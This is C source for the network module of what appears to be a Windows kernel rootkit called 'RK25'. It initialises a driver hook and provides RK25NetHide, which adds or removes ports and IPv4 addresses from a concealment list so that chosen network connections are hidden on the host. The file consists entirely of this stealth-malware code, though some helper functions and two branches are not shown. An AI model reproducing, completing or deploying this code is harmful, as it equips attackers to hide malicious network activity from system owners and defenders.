#pragma once
#include "rk25_net.h"

#define RK25_PROLOG_NET "Net Dispatcher"

VOID RK25NetInit() {
	RK25QueueNetDriverInit();
	RK25HideNetInit();
}
VOID RK25NetFree() {
	RK25HideNetFree();
	RK25QueueNetDriverFree();
}
NTSTATUS RK25NetHook(ULONG attr) { return RK25NetDriverHook(attr); }

NTSTATUS RK25NetHide(ULONG attr, PVOID target) {
	NTSTATUS status = STATUS_SUCCESS;
	ULONG ip = 0;
	WCHAR ipString[16] = { 0 };
	USHORT port = 0;

	if (!(attr & RK25_ACTION_ENABLE || attr & RK25_ACTION_DISABLE)) {
		RK25_DBG_ERR(RK25_PROLOG_NET, "Action is not defined");
		return STATUS_NOT_SUPPORTED;
	}

	if (attr & RK25_TARGET_DECIMAL) {
		
	}
	else if (attr & RK25_TARGET_STRING) {
		
	} else {
		RK25_DBG_ERR(RK25_PROLOG_NET, "Unsupported target");
		return STATUS_NOT_SUPPORTED;
	}

	if (attr & RK25_ACTION_ENABLE) {
		if (attr & RK25_TARGET_DECIMAL) {
			port = (USHORT)target;
			if (!RK25HideNetGetByPort(port, attr)) {
				if (!RK25HideNetAddByPort(attr, port)) {
					status = STATUS_UNSUCCESSFUL;
				}
			}
			else {
				RK25_DBG_ERR_F(RK25_PROLOG_NET, "This port:%d has been already hided", port);
				status = STATUS_ALREADY_COMMITTED;
			}
			
		}
		else if (attr & RK25_TARGET_STRING) {
			if (MmIsAddressValid(target)) {
				PCHAR ipstr = (PCHAR)target;
				ULONG ip = 0;
				status = RK25ConvertIPv4Str2Dec(ipstr, &ip);
					
				if (NT_SUCCESS(status)) {
					if (!RK25HideNetGetByIP(ip, attr)) {
						if (!RK25HideNetAddByIP(attr, ip))
							status = STATUS_UNSUCCESSFUL;
					}
					else {
						RK25_DBG_ERR_F(RK25_PROLOG_NET, "This ip:%s has been already hided", ipstr);
						status = STATUS_ALREADY_COMMITTED;
					}
				}
			}
			else status = STATUS_INVALID_PARAMETER;
		}
	}
	else if (attr & RK25_ACTION_DISABLE) {
		if (attr & RK25_TARGET_DECIMAL) {
			port = (USHORT)target;
			if (RK25HideNetGetByPort(port, attr)) {
				RK25HideNetDelByPort(port, attr);
			}
			else {
				RK25_DBG_ERR_F(RK25_PROLOG_NET, "This port:%d has been not hided", port);
				status = STATUS_NOT_FOUND;
			}
		}
		else if (attr & RK25_TARGET_STRING) {
			if (MmIsAddressValid(target)) {
				PCHAR ipstr = (PCHAR)target;
				ULONG ip = 0;
				status = RK25ConvertIPv4Str2Dec(ipstr, &ip);

				if (NT_SUCCESS(status)) {
					if (RK25HideNetGetByIP(ip, attr)) {
						RK25HideNetDelByIP(attr, ip);
					}
					else {
						RK25_DBG_ERR_F(RK25_PROLOG_NET, "This ip:%s has been not hided", ipstr);
						status = STATUS_NOT_FOUND;
					}
				}
			}
			else status = STATUS_INVALID_PARAMETER;
		}
	}

	return status;
}